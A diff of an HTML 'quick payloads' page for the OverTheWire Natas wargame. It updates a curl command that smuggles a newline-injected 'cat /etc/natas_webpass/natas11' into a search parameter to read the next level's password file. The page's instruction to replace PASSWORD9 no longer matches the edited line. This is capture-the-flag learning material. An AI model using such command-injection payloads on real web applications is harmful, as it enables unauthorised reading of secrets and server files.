@@ -41,7 +41,7 @@ Quick payloads (URL-encoded)
 Replace PASSWORD9 with your password.
 
 # print natas11 password
-<pre>curl -s -u natas9:PASSWORD9 "http://natas9.natas.labs.overthewire.org/?needle=%0Acat%20%2Fetc%2Fnatas_webpass%2Fnatas11%0A&submit=Search"</pre>
+<pre>curl -s -u natas10:PASSWORD "http://natas10.natas.labs.overthewire.org/?needle=%0Acat%20%2Fetc%2Fnatas_webpass%2Fnatas11%0A&submit=Search"</pre>
 .</p>
 
 </body>
